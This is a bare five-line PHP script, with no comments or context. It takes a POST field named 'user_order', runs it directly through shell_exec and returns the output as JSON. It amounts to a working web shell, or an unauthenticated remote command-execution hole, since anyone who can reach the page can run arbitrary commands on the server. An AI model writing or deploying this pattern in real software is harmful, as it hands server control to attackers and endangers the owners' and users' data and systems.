<?php
	$user_order = $_POST['user_order'];
	$list = shell_exec($user_order);
	echo json_encode($list);
?>